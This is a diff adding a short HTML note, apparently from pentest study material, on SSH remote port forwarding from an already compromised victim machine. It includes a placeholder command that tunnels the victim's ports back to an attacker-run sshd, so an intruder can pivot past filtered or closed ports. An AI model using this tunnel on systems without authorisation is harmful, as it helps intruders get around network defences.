@@ -1,0 +1,19 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>REMOTE</title>
+</head><body><b><span style="font-size: 12pt">REMOTE port forwarding</span><br/>
+<br/>
+</b>Forwards remote port to local server.<br/>
+If we are able to get the shell on the victim machine we can connect even to filtered or closed ports.<br/>
+We need run sshd on attacker machine and have ssh installed on the victim machine.<br/>
+<br/>
+<b>Command<br/>
+</b><br/>
+Executed on already compromised remote machine<br/>
+<br/>
+<tt>ssh &lt;user@attackers_sshd_IP&gt; -p &lt;attackers_sshd_port&gt; -R &lt;remote_port&gt;:&lt;localhost&gt;:&lt;local_port&gt;</tt><br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+</body></html>
